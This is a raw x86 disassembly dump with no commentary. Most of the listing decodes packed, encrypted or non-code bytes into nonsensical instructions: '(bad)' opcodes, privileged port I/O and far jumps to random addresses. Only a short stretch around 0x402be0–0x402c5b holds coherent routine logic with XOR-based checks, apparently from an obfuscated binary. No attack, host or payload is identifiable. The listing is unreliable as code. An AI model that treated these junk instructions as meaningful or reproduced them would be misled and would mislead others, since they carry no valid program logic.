  4028ec:	jl     0x402922
  4028ee:	xor    esp,edi
  4028f0:	sub    DWORD PTR [esi+0x49],edx
  4028f3:	or     DWORD PTR [ebp+0x4a51192f],esi
  4028f9:	cld    
  4028fa:	or     cl,BYTE PTR [edi+0x27279a1c]
  402900:	shl    BYTE PTR [ecx-0x1b89c3e4],0x1c
  402907:	and    al,0x8c
  402909:	or     DWORD PTR [eax-0x15],ebp
  40290c:	xlat   BYTE PTR ds:[ebx]
  40290d:	es sbb al,0x39
  402910:	shr    BYTE PTR [ecx+0x5d],0x93
  402914:	push   ebp
  402915:	outs   dx,DWORD PTR ds:[esi]
  402916:	jge    0x402970
  402918:	and    DWORD PTR [ebx-0x58],ebx
  40291b:	xchg   esp,eax
  40291c:	xchg   DWORD PTR [esi+0x78b22eb7],ebx
  402922:	pop    ebx
  402923:	inc    ecx
  402924:	pusha  
  402925:	jae    0x402958
  402927:	stc    
  402928:	lods   eax,DWORD PTR ds:[esi]
  402929:	pushf  
  40292a:	pop    edi
  40292b:	das    
  40292c:	int3   
  40292d:	ret    0xfd24
  402930:	mov    WORD PTR [esi-0x29],fs
  402933:	cs jne 0x402924
  402936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402937:	ins    BYTE PTR es:[edi],dx
  402938:	test   eax,0x5a5414c2
  40293d:	out    0xb1,eax
  40293f:	jp     0x40296e
  402941:	les    ecx,FWORD PTR [esi*1-0x60d2ea36]
  402948:	dec    eax
  402949:	mov    ds:0x8e873ccd,al
  40294e:	fisub  WORD PTR ds:0xeb616c6f
  402954:	imul   edx,DWORD PTR [esi+eax*8+0x4f],0x19
  402959:	mov    eax,0x42720ecd
  40295e:	add    BYTE PTR [esi-0x68],dh
  402961:	adc    ebx,ecx
  402963:	icebp  
  402964:	fcom   DWORD PTR [ecx-0x17]
  402967:	pop    esi
  402968:	stos   BYTE PTR es:[edi],al
  402969:	int    0x49
  40296b:	sub    ecx,DWORD PTR [edi+edx*2]
  40296e:	inc    ecx
  40296f:	out    0xd6,al
  402971:	xchg   ebp,eax
  402972:	pop    ss
  402973:	lea    esi,[edx-0x7cd89625]
  402979:	das    
  40297a:	cmp    BYTE PTR [ebx-0x46],0xca
  40297e:	sar    DWORD PTR [ecx],1
  402980:	mov    dh,0x64
  402982:	pop    es
  402983:	pop    ecx
  402984:	mov    ah,0xc9
  402986:	jl     0x402937
  402988:	cmp    edi,DWORD PTR [edx-0x53]
  40298b:	and    esi,DWORD PTR [esi-0x7de07dfc]
  402991:	xchg   al,cl
  402993:	inc    ebx
  402994:	ret    0x633f
  402997:	push   ds
  402998:	adc    eax,0x20f47903
  40299d:	adc    al,0xf8
  40299f:	out    0xc2,eax
  4029a1:	sti    
  4029a2:	(bad)  
  4029a3:	xor    ecx,DWORD PTR [edx+esi*2]
  4029a6:	rcr    BYTE PTR [ecx-0x27],0x50
  4029aa:	jmp    0x402a09
  4029ac:	fsub   QWORD PTR [esi+edx*1-0xd]
  4029b0:	push   esp
  4029b1:	(bad)  
  4029b2:	fist   DWORD PTR [edi-0x48ee532f]
  4029b8:	ja     0x402965
  4029ba:	or     eax,0x44e8794a
  4029bf:	scas   al,BYTE PTR es:[edi]
  4029c0:	jecxz  0x402a2f
  4029c2:	(bad)  
  4029c3:	and    al,0x9d
  4029c5:	push   eax
  4029c6:	rcr    BYTE PTR [ebp+0x6667bd4c],0xb1
  4029cd:	jo     0x4029f7
  4029cf:	mov    ah,0x3b
  4029d1:	mov    edi,0x4637208f
  4029d6:	pop    esp
  4029d7:	into   
  4029d8:	call   0xe94744b6
  4029dd:	inc    edi
  4029de:	add    BYTE PTR [edi+0x5e],bh
  4029e1:	out    dx,eax
  4029e2:	call   0x53fd2958
  4029e7:	scas   eax,DWORD PTR es:[edi]
  4029e8:	and    DWORD PTR [ebx],ecx
  4029ea:	mov    ch,BYTE PTR [edx+0x65]
  4029ed:	scas   al,BYTE PTR es:[edi]
  4029ee:	inc    esi
  4029ef:	dec    edx
  4029f0:	test   eax,0x79b47a2e
  4029f5:	jp     0x402986
  4029f7:	in     eax,0x75
  4029f9:	push   ebx
  4029fa:	test   DWORD PTR [ebx-0x2c],edi
  4029fd:	and    DWORD PTR [edx],esp
  4029ff:	mov    ebx,0xa5108b2f
  402a04:	inc    esp
  402a05:	dec    ebx
  402a06:	ins    BYTE PTR es:[edi],dx
  402a07:	and    BYTE PTR [esi],bl
  402a09:	test   al,0x34
  402a0b:	out    dx,eax
  402a0c:	inc    eax
  402a0d:	mov    eax,?
  402a0f:	inc    esp
  402a10:	pop    esi
  402a11:	add    ebx,ecx
  402a13:	adc    BYTE PTR [ebx+0x34],dh
  402a16:	rcl    BYTE PTR [edx],0xb9
  402a19:	lods   eax,DWORD PTR ds:[esi]
  402a1a:	add    DWORD PTR [ebp+0x57],esi
  402a1d:	jecxz  0x402a69
  402a1f:	iret   
  402a20:	mov    ebp,0x16e9e9ae
  402a25:	(bad)  
  402a26:	add    DWORD PTR [ecx],0xacfde2e1
  402a2c:	outs   dx,BYTE PTR ds:[esi]
  402a2d:	(bad)  
  402a2f:	inc    esp
  402a30:	in     eax,dx
  402a31:	mov    ds:0x5017c841,eax
  402a36:	push   eax
  402a37:	mov    ecx,0xe08431e
  402a3c:	cwde   
  402a3d:	dec    edi
  402a3e:	sbb    DWORD PTR [edx-0x4e636ac],0xffffff87
  402a45:	mov    ah,0x6c
  402a47:	mov    edi,0xb3751a83
  402a4c:	push   0xffffffaf
  402a4e:	cmc    
  402a4f:	inc    edi
  402a50:	into   
  402a51:	retf   0xe18c
  402a54:	fdiv   DWORD PTR [esi+0x9]
  402a57:	mov    esp,0x56b0387c
  402a5c:	mov    esp,0x7d474ef
  402a61:	push   ds
  402a62:	xchg   edx,eax
  402a63:	push   esi
  402a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a65:	fwait
  402a66:	inc    eax
  402a67:	mov    ss,WORD PTR [esi+ebx*4+0x1c6ae0c1]
  402a6e:	addr16 (bad) 
  402a70:	std    
  402a71:	in     al,dx
  402a72:	sbb    bh,dl
  402a74:	sti    
  402a75:	pop    edi
  402a77:	test   edx,ecx
  402a79:	loope  0x402ae5
  402a7b:	add    eax,0x5face129
  402a80:	sbb    BYTE PTR [ecx-0x2e],bh
  402a83:	xchg   edi,eax
  402a84:	addr16 adc eax,0x5579b4a6
  402a8a:	push   ebx
  402a8b:	adc    eax,0xf2ce84f4
  402a90:	dec    esp
  402a91:	arpl   WORD PTR [ebx],bp
  402a93:	outs   dx,DWORD PTR ds:[esi]
  402a94:	mov    esi,esp
  402a96:	adc    eax,DWORD PTR [edx-0x5fd0d4ee]
  402a9c:	xlat   BYTE PTR ds:[ebx]
  402a9d:	xchg   BYTE PTR [eax],al
  402a9f:	mov    ah,0x22
  402aa1:	dec    eax
  402aa2:	and    ah,BYTE PTR [edx]
  402aa4:	retf   
  402aa5:	scas   eax,DWORD PTR es:[edi]
  402aa6:	into   
  402aa7:	fwait
  402aa8:	inc    ecx
  402aa9:	sar    DWORD PTR ds:0x304a08ea,0xc4
  402ab0:	cmp    al,ch
  402ab2:	add    DWORD PTR [edx+0x72e8bfa3],0x2a
  402ab9:	mov    ebp,0xd72dd66e
  402abe:	(bad)  
  402abf:	fld    TBYTE PTR [esi]
  402ac1:	pop    esi
  402ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ac3:	mov    al,ds:0x1824827a
  402ac8:	int    0x5b
  402aca:	add    DWORD PTR [esp+esi*2-0x4f],ebx
  402ace:	mov    BYTE PTR [edi],cl
  402ad0:	int    0xab
  402ad2:	gs inc edi
  402ad4:	xlat   BYTE PTR ds:[ebx]
  402ad5:	mov    bh,0x18
  402ad7:	pushf  
  402ad8:	scas   eax,DWORD PTR es:[edi]
  402ad9:	inc    ebp
  402ada:	pop    es
  402adb:	and    DWORD PTR [ebp-0x7b079dcf],0x54a86a16
  402ae5:	div    cl
  402ae7:	pmullw mm2,QWORD PTR [ebx]
  402aea:	lock mov edi,0x695fac6e
  402af0:	aam    0xaf
  402af2:	mov    dl,0xd7
  402af4:	and    edx,DWORD PTR [eax+0x18]
  402af7:	pop    esp
  402af8:	push   cs
  402af9:	dec    eax
  402afa:	xchg   bl,dl
  402afc:	aaa    
  402afd:	and    eax,0x764a192e
  402b02:	sub    dl,BYTE PTR [eax+0x6ca44b90]
  402b08:	(bad)  
  402b09:	bswap  esi
  402b0b:	js     0x402aa8
  402b0d:	aas    
  402b0e:	sbb    DWORD PTR [edi-0x42b0b657],ebp
  402b14:	dec    ecx
  402b15:	ret    
  402b16:	icebp  
  402b17:	add    BYTE PTR [ebp-0x384a0fea],ch
  402b1d:	push   es
  402b1e:	or     al,0xdb
  402b20:	test   BYTE PTR [edx],ch
  402b22:	fbstp  TBYTE PTR [ecx-0x32e30d0e]
  402b28:	loop   0x402b21
  402b2a:	adc    BYTE PTR [ecx-0x35],ah
  402b2d:	inc    ebp
  402b2e:	push   ebx
  402b2f:	cmp    al,0x85
  402b31:	mov    ds:0xe8bab796,al
  402b36:	loope  0x402b84
  402b38:	mov    eax,0xdd54080b
  402b3d:	outs   dx,BYTE PTR ds:[esi]
  402b3e:	or     al,0xa6
  402b40:	fwait
  402b41:	mov    edx,0x7166558c
  402b46:	jne    0x402b51
  402b48:	sub    al,ah
  402b4a:	inc    eax
  402b4b:	cmp    DWORD PTR [edx-0x5ad74781],esp
  402b51:	sar    DWORD PTR [ebp+0x64],0x26
  402b55:	jecxz  0x402bb8
  402b57:	and    al,0x46
  402b59:	mov    ds:0x4db38771,eax
  402b5e:	dec    eax
  402b5f:	fimul  WORD PTR [esi+0x76c67ed]
  402b65:	cmp    DWORD PTR ss:[edi],esp
  402b68:	gs leave 
  402b6a:	sub    DWORD PTR [eax-0x22],esi
  402b6d:	mov    dh,0x57
  402b6f:	inc    ebx
  402b70:	adc    eax,0x49d2e394
  402b75:	int    0x81
  402b77:	bound  ecx,QWORD PTR [eax]
  402b79:	pop    edx
  402b7a:	stos   DWORD PTR es:[edi],eax
  402b7b:	call   0x7a18:0x5800364d
  402b82:	pusha  
  402b83:	pop    esi
  402b84:	in     al,0xd7
  402b86:	push   es
  402b87:	sbb    al,0xbb
  402b89:	pop    edi
  402b8a:	sub    dh,BYTE PTR [eax-0x7517f88a]
  402b90:	rol    BYTE PTR [ebx+0x3b],1
  402b93:	lahf   
  402b94:	jae    0x402b8b
  402b96:	xor    ecx,ecx
  402b98:	outs   dx,BYTE PTR ds:[esi]
  402b99:	lahf   
  402b9a:	shl    DWORD PTR [ebp+edx*8-0x36],1
  402b9e:	push   DWORD PTR [ecx+0x34934bf2]
  402ba4:	mul    DWORD PTR [eax+0x3]
  402ba7:	retf   0x9431
  402baa:	das    
  402bab:	(bad)  
  402bac:	int    0x8c
  402bae:	loopne 0x402b73
  402bb0:	rcl    DWORD PTR [ebx-0x621fa91d],cl
  402bb6:	sbb    edi,edx
  402bb8:	mov    ah,0x33
  402bba:	push   eax
  402bbb:	int    0xa1
  402bbd:	popa   
  402bbe:	pop    ss
  402bbf:	cld    
  402bc0:	and    bh,BYTE PTR [eax+0x608b41f0]
  402bc6:	cmp    DWORD PTR [edx+0x6a],edi
  402bc9:	pop    ds
  402bca:	push   ebp
  402bcb:	outs   dx,BYTE PTR ds:[esi]
  402bcc:	and    ecx,edx
  402bce:	push   edi
  402bcf:	aaa    
  402bd0:	sub    DWORD PTR [ebx],ecx
  402bd2:	add    eax,0x8b009fc3
  402bd7:	inc    eax
  402bd8:	cmp    al,0x8d
  402bda:	or     al,0xcd
  402bdc:	js     0x402bde
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	dec    ebp
  402c6d:	mov    cl,0x34
  402c6f:	xchg   edi,eax
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	mov    dl,0x68
  402c7a:	mul    bh
  402c7c:	(bad)  
  402c7d:	sbb    al,0x66
  402c7f:	sub    BYTE PTR [ecx-0x1f298e52],dl
  402c85:	xchg   edi,eax
  402c86:	jne    0x402ced
  402c88:	sbb    ecx,DWORD PTR fs:[edi+0x8]
  402c8c:	data16 int3 
  402c8e:	test   eax,0xbfd44e71
  402c93:	outs   dx,DWORD PTR ds:[esi]
  402c94:	xchg   ebp,eax
  402c95:	scas   eax,DWORD PTR es:[edi]
  402c96:	hlt    
  402c97:	adc    al,0x99
  402c99:	xchg   edi,eax
  402c9a:	mov    WORD PTR [edi+0x3f],fs
  402c9d:	or     al,0x9d
  402c9f:	inc    eax
  402ca0:	shl    BYTE PTR [esi-0x39],0xf2
  402ca4:	mov    al,ds:0xf85350e0
  402ca9:	imul   edi,esp,0xffffffa5
  402cac:	xor    ah,dh
  402cae:	sahf   
  402caf:	aas    
  402cb0:	pop    DWORD PTR [ecx-0x3c527c57]
  402cb6:	xchg   ebp,eax
  402cb7:	mov    ah,0xfb
  402cb9:	inc    esp
  402cba:	xor    edi,ebp
  402cbc:	mov    dh,0x68
  402cbe:	adc    DWORD PTR [edx],eax
  402cc0:	aad    0xde
  402cc2:	jmp    0x6eddf400
  402cc7:	xor    eax,0x936ab89e
  402ccc:	adc    ebp,ecx
  402cce:	fidiv  DWORD PTR [eax]
  402cd0:	shl    DWORD PTR [ebx+ebx*8+0x4f],cl
  402cd4:	mov    esp,0x9a69311e
  402cd9:	nop
  402cda:	(bad)  
  402cdb:	push   edi
  402cdc:	jbe    0x402cf6
  402cde:	(bad)  
  402cdf:	(bad)  
  402ce0:	push   eax
  402ce1:	dec    ecx
  402ce2:	and    al,0x5e
  402ce4:	fistp  QWORD PTR [ebp+0x5]
  402ce7:	sub    eax,0xadc1c1d
  402cec:	cmp    eax,0x8b900c3e
  402cf1:	stc    
  402cf2:	inc    ebx
  402cf3:	sub    eax,0x410dc79b
  402cf8:	scas   eax,DWORD PTR es:[edi]
  402cf9:	(bad)  
  402cfa:	(bad)  
  402cfb:	push   cs
  402cfc:	cmp    eax,0x5a4041a4
  402d01:	and    eax,0xeaa96775
  402d06:	sub    al,0x61
  402d08:	mov    eax,ds:0x94dbb42c
  402d0d:	shl    DWORD PTR [eax-0x3],cl
  402d10:	cld    
  402d11:	nop
  402d12:	ja     0x402d59
  402d14:	add    al,0xd0
  402d16:	jecxz  0x402cea
  402d18:	adc    bh,BYTE PTR [edi]
  402d1a:	add    BYTE PTR [esi+0x5a],bh
  402d1d:	je     0x402d1a
  402d1f:	loopne 0x402d48
  402d21:	add    DWORD PTR [edx+0x6a],ebx
  402d24:	fnsave [edi]
  402d26:	sub    al,0xd4
  402d28:	sub    eax,0x91d4b0c1
  402d2d:	jecxz  0x402cb9
  402d2f:	daa    
  402d30:	stos   BYTE PTR es:[edi],al
  402d31:	xchg   ebp,eax
  402d32:	or     BYTE PTR cs:[ebp+0x70],bl
  402d36:	mov    ebx,0xda364a1e
  402d3b:	(bad)  
  402d3c:	add    eax,0xfc32eefb
  402d41:	data16 jno 0x402d25
  402d44:	or     edx,ebx
  402d46:	sub    DWORD PTR [edi],eax
  402d48:	mov    cs,WORD PTR [ecx-0x30e22952]
  402d4e:	dec    edx
  402d4f:	ret    0x9b6e
  402d52:	shr    bh,1
  402d54:	dec    ebx
  402d55:	repnz cmp BYTE PTR [edx+ebx*4],0xa0
  402d5a:	mov    edx,0x9861f366
  402d5f:	push   edx
  402d60:	pop    esi
  402d61:	in     eax,dx
  402d62:	or     dl,BYTE PTR [eax-0x12831744]
  402d68:	sar    DWORD PTR [esi-0x3471ac31],cl
  402d6e:	mov    eax,0x42012a02
  402d73:	mov    edx,0x2bd9fc0c
  402d78:	test   DWORD PTR [edx],ecx
  402d7a:	push   cs
  402d7b:	sub    esp,DWORD PTR [ebx+0x1d7bf35e]
  402d81:	das    
  402d82:	pop    ecx
  402d83:	lods   eax,DWORD PTR ds:[esi]
  402d84:	retf   0xfdb6
  402d87:	dec    ebp
  402d88:	push   ecx
  402d89:	(bad)  
  402d8a:	mov    ah,0xa2
  402d8c:	call   0xca2f1281
  402d91:	mov    esp,0xe8d2182c
  402d96:	mov    fs,WORD PTR [edx]
  402d98:	xlat   BYTE PTR ds:[ebx]
  402d99:	or     ecx,ebp
  402d9b:	jo     0x402d96
  402d9d:	add    bh,BYTE PTR [eax+0x3026f071]
  402da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da4:	mov    bl,0xb4
  402da6:	or     BYTE PTR [edx-0xbc7294],0xdc
  402dad:	sti    
  402dae:	sbb    al,0x72
  402db0:	xchg   DWORD PTR [ecx+0x46],eax
  402db3:	sbb    dh,cl
  402db5:	pop    DWORD PTR [edi+0x13]
  402db8:	or     BYTE PTR [eax],bl
  402dba:	xchg   edx,eax
  402dbb:	xchg   esp,eax
  402dbc:	sbb    bl,ah
  402dbe:	mov    edi,0xcb871a06
  402dc3:	in     eax,0x9a
  402dc5:	daa    
  402dc6:	aad    0x4a
  402dc8:	pusha  
  402dc9:	loopne 0x402d8d
  402dcb:	cs jmp 0x59f66488
  402dd1:	enter  0x770e,0x4f
  402dd5:	(bad)  
  402dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dd7:	mov    BYTE PTR [ebp-0x6fd15753],ah
  402ddd:	and    ch,bl
  402ddf:	dec    edi
  402de0:	sbb    BYTE PTR gs:[eax],dl
  402de3:	sub    eax,0xa4f5ea99
  402de8:	es scas eax,DWORD PTR es:[edi]
  402dea:	and    al,0x24
  402dec:	bound  ebx,QWORD PTR [ecx]
  402dee:	cli    
  402def:	lock nop
  402df1:	(bad)  
  402df2:	pop    ss
  402df3:	mov    bh,0x59
  402df5:	cdq    
  402df6:	dec    edx
  402df7:	fnstenv [ebp-0x4ed24aae]
  402dfd:	ret    0xf2c4
  402e00:	loop   0x402e7f
  402e02:	dec    edx
  402e03:	and    DWORD PTR [edi-0x62],esp
  402e06:	sub    bh,ch
  402e08:	outs   dx,BYTE PTR ds:[esi]
  402e09:	cdq    
  402e0a:	xchg   ecx,eax
  402e0b:	ja     0x402e23
  402e0d:	xor    al,0x59
  402e0f:	mov    ?,WORD PTR [ecx]
  402e11:	inc    ecx
  402e12:	cmc    
  402e13:	cwde   
  402e14:	mov    ds:0xfa2c2846,eax
  402e19:	xchg   ebp,ecx
  402e1b:	inc    esi
  402e1c:	pop    ecx
  402e1d:	or     al,BYTE PTR [ebp+edi*8-0x530a8c5f]
  402e24:	into   
  402e25:	jne    0x402e0b
  402e27:	xchg   ebx,eax
  402e28:	jp     0x402e22
  402e2a:	jp     0x402db7
  402e2c:	jecxz  0x402e26
  402e2e:	scas   eax,DWORD PTR es:[edi]
  402e2f:	mov    ebx,ebp
  402e31:	aas    
  402e32:	retf   0x4ca
  402e35:	nop
  402e36:	xchg   esp,eax
  402e37:	sbb    ch,0x2b
  402e3a:	mov    ebp,DWORD PTR [ecx-0x75]
  402e3d:	and    eax,0xe2066885
  402e42:	inc    ebp
  402e43:	scas   al,BYTE PTR es:[edi]
  402e44:	mov    esp,0xc4bad0aa
  402e49:	sbb    bh,dh
  402e4b:	lock adc ecx,ebp
  402e4e:	jmp    0x9631:0xa91ea9cd
  402e55:	mov    dl,0x72
  402e57:	lds    esi,FWORD PTR [ebp+0x2da74c6d]
  402e5d:	sbb    BYTE PTR [esi-0x73],cl
  402e60:	sub    DWORD PTR [ecx-0x4d],0xfffffff4
  402e64:	sub    ecx,DWORD PTR [ebx]
  402e66:	repnz loop 0x402ea7
  402e69:	adc    ch,0x4f
  402e6c:	call   0xfa7e075d
  402e71:	int3   
  402e72:	xchg   edi,eax
  402e73:	dec    edx
  402e74:	(bad)  
  402e75:	cdq    
  402e76:	mov    eax,0xb8c73427
  402e7b:	push   es
  402e7c:	sbb    al,0x6
  402e7e:	test   DWORD PTR [eax],ebx
  402e80:	push   ecx
  402e81:	push   esp
  402e82:	ins    DWORD PTR es:[edi],dx
  402e83:	fist   DWORD PTR [esi]
  402e85:	dec    edx
  402e86:	add    bh,cl
  402e88:	pusha  
  402e89:	mov    al,ds:0x56ae98ca
  402e8e:	mov    fs,esp
  402e90:	scas   al,BYTE PTR es:[edi]
  402e91:	xchg   ebx,eax
  402e92:	ud1    ebp,DWORD PTR [eax+0x3289cde3]
  402e99:	xor    BYTE PTR [edx-0xb98e444],bl
  402e9f:	push   ss
  402ea0:	loopne 0x402e6f
  402ea2:	xchg   esp,eax
  402ea3:	inc    ebp
  402ea4:	and    ch,BYTE PTR [ecx-0x36ec743c]
  402eaa:	push   cs
  402eab:	sbb    edx,DWORD PTR [ebx]
  402ead:	mov    ah,0x4d
  402eaf:	fwait
  402eb0:	scas   al,BYTE PTR es:[edi]
  402eb1:	xchg   edi,eax
  402eb2:	inc    ebx
  402eb3:	repz arpl WORD PTR [edi],si
  402eb6:	push   eax
  402eb7:	xchg   esi,eax
  402eb8:	mov    ebp,0xd235025a
  402ebd:	xchg   esi,eax
  402ebe:	adc    BYTE PTR [edx-0x653fb161],0x79
  402ec5:	or     BYTE PTR [esp+eiz*8-0x5f],bl
  402ec9:	xor    eax,0xa97aed62
  402ece:	mov    DWORD PTR [edi-0x63],0x15215a0a
  402ed5:	push   ebp
  402ed6:	shl    BYTE PTR [edi],1
  402ed8:	xchg   ebp,eax
  402ed9:	neg    ebp
  402edb:	and    dl,BYTE PTR ds:0x777fc19d
  402ee1:	cwde   
  402ee2:	scas   eax,DWORD PTR es:[edi]
  402ee3:	mov    ds,WORD PTR [edi+0x56]
  402ee6:	cmp    al,0xce
  402ee8:	jecxz  0x402f4f
  402eea:	inc    ebx
  402eeb:	dec    edi
  402eec:	push   ebx
  402eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eee:	cs leavew 
  402ef1:	push   ebx
  402ef2:	xchg   BYTE PTR [edx+0x491d7b6b],bl
  402ef8:	loopne 0x402ea1
  402efa:	clc    
  402efb:	(bad)  
  402efc:	cmp    BYTE PTR [esi],bh
  402efe:	sub    al,0xc5
  402f00:	xor    al,0x1a
  402f02:	int    0x6
  402f04:	sbb    eax,0x973008d4
  402f09:	lods   al,BYTE PTR ds:[si]
  402f0b:	fsub   QWORD PTR [edx]
  402f0d:	jnp    0x402f0a
  402f0f:	pop    es
  402f10:	inc    edx
  402f11:	push   ss
  402f12:	addr16 imul ebp,ebp,0xffffffda
  402f16:	sar    DWORD PTR [eax-0x2d06a9af],cl
  402f1c:	sahf   
  402f1d:	out    dx,al
  402f1e:	cwde   
  402f1f:	lock push ebx
  402f21:	add    eax,0x586abd22
  402f26:	lods   eax,DWORD PTR ds:[esi]
  402f27:	stc    
  402f28:	(bad)  
  402f29:	cld    
  402f2a:	inc    ebp
  402f2b:	cmp    BYTE PTR [esi],dl
  402f2d:	mov    ebx,0xfa080d83
  402f32:	add    edx,esi
  402f34:	ds inc ebx
  402f36:	ds sub eax,0x60d98311
  402f3c:	sub    DWORD PTR [ebp-0xd],ebx
  402f3f:	xor    DWORD PTR [edx-0x31],edi
  402f42:	inc    ebp
  402f43:	mov    bh,0x99
  402f45:	push   ss
  402f46:	mov    dh,0xf
  402f48:	inc    ebx
  402f49:	pop    ss
  402f4a:	scas   eax,DWORD PTR es:[edi]
  402f4b:	mov    eax,ds:0xc9d114ea
  402f50:	mov    ecx,0xea5beb87
  402f55:	adc    BYTE PTR [edx-0x43],ah
  402f58:	stos   BYTE PTR es:[edi],al
  402f59:	fnstenv [edx+0x7]
  402f5c:	xor    eax,0x5446bc5a
  402f61:	push   DWORD PTR [ebp-0x8]
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0xeb7:0x1360eb95
  402f8e:	dec    esi
  402f8f:	inc    eax
  402f90:	das    
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402f7f
  402f99:	mov    ds:0x1396389e,eax
  402f9e:	mov    bh,0xc2
  402fa0:	push   edx
  402fa1:	jnp    0x402fbd
  402fa3:	outs   dx,DWORD PTR ds:[esi]
  402fa4:	lock ins BYTE PTR es:[edi],dx
  402fa6:	mov    ?,WORD PTR ds:0x8f25a553
  402fac:	lods   eax,DWORD PTR ds:[esi]
  402fad:	adc    DWORD PTR [edx],esp
  402faf:	inc    DWORD PTR [esi]
  402fb1:	and    ecx,eax
  402fb3:	stos   DWORD PTR es:[edi],eax
  402fb4:	hlt    
  402fb5:	xchg   esp,eax
  402fb6:	jl     0x403033
  402fb8:	or     BYTE PTR [edx+0x5f],dh
  402fbb:	shl    DWORD PTR [edi-0x23],0x75
  402fbf:	add    eax,0x37f98a2d
  402fc4:	push   edx
  402fc5:	scas   eax,DWORD PTR es:[edi]
  402fc6:	mov    ecx,0xde3098a4
  402fcb:	hlt    
  402fcc:	jecxz  0x402fc7
  402fce:	js     0x402fb6
  402fd0:	mov    BYTE PTR [edi-0x14],dl
  402fd3:	(bad)  
  402fd4:	call   0xbbd7cde
  402fd9:	adc    al,ah
  402fdb:	scas   eax,DWORD PTR es:[edi]
  402fdc:	add    esi,DWORD PTR [edx]
  402fde:	or     al,0x64
  402fe0:	jae    0x402f8a
  402fe2:	mov    cl,0x12
  402fe4:	push   ss
  402fe5:	mov    ch,0x71
  402fe7:	inc    ebx
  402fe8:	cmp    DWORD PTR [esi+0x16],esi
  402feb:	xor    eax,0xb38f5297
  402ff0:	jb     0x402faa
  402ff2:	aas    
  402ff3:	push   edi
  402ff4:	mov    edi,0x9921454a
  402ff9:	adc    BYTE PTR [esi],bh
  402ffb:	not    edi
  402ffd:	mov    bl,BYTE PTR [ebx+edi*8+0x25]
  403001:	add    al,0xec
  403003:	jnp    0x402fc4
  403005:	mul    DWORD PTR [edx]
  403007:	mov    ebp,0xef945dc4
  40300c:	pop    esp
  40300d:	test   al,0x64
  40300f:	pop    es
  403010:	les    eax,FWORD PTR [ebp-0x30]
  403013:	jb     0x40307d
  403015:	adc    edi,eax
  403017:	cli    
  403018:	sbb    BYTE PTR [esi],ah
  40301a:	mov    ds:0xdb7cd50e,eax
  40301f:	bound  edi,QWORD PTR [esi]
  403021:	jecxz  0x403036
  403023:	(bad)  
  403024:	loopne 0x40304d
  403026:	jmp    0x40307d
  403028:	push   esi
  403029:	cmp    ah,BYTE PTR [eax]
  40302b:	sbb    DWORD PTR [ecx],0xe370bcbf
  403031:	(bad)  [eax+0x7c]
  403034:	nop
  403035:	(bad)  
  403036:	mov    esp,0x65bd5255
  40303b:	add    eax,DWORD PTR [ebp-0x7a]
  40303e:	mov    ds,ecx
  403040:	or     bl,BYTE PTR [eax+0x41f35a50]
  403046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403047:	mov    bl,0x57
  403049:	push   0xffffff97
  40304b:	mov    ch,0x34
  40304d:	stos   BYTE PTR es:[edi],al
  40304e:	mov    al,0xfd
  403050:	pop    ds
  403051:	rcl    BYTE PTR [ecx-0x1c5dbb6c],0xee
  403058:	or     BYTE PTR [esi-0x2cfff094],cl
  40305e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40305f:	cwde   
  403060:	in     al,0xd7
  403062:	in     al,0x76
